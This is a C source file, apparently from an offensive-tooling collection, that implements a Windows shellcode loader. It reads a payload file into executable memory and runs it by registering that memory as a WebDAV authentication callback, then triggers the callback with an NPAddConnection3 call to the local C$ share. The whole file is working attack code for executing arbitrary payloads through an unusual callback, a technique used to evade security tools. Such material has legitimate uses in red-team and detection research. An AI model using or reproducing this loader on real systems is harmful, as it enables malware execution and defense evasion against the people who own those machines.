// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Davclnt.lib")
#pragma comment(lib, "Netapi32.lib")

#include <stdio.h>
#include <windows.h>
#include <davclnt.h>
#include <npapi.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	OPAQUE_HANDLE hOpaque = 0;
	HANDLE hCallbackReg = NULL;

	if (argc != 2)
	{
		printf("Usage: NPAddConnection3.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (!hAlloc)
		goto CLEANUP;

	memcpy(hAlloc, Shellcode, SCLen);

	hOpaque = DavRegisterAuthCallback((PFNDAVAUTHCALLBACK)hAlloc, 0);

	NETRESOURCE sNR = { 0 };
	sNR.lpRemoteName = L"\\\\127.0.0.1\\C$";
	sNR.lpLocalName = NULL;
	sNR.dwType = RESOURCETYPE_ANY;

	NPAddConnection3(NULL, &sNR, NULL, NULL, CONNECT_INTERACTIVE | CONNECT_PROMPT);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	if (hOpaque)
		DavUnregisterAuthCallback(hOpaque);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}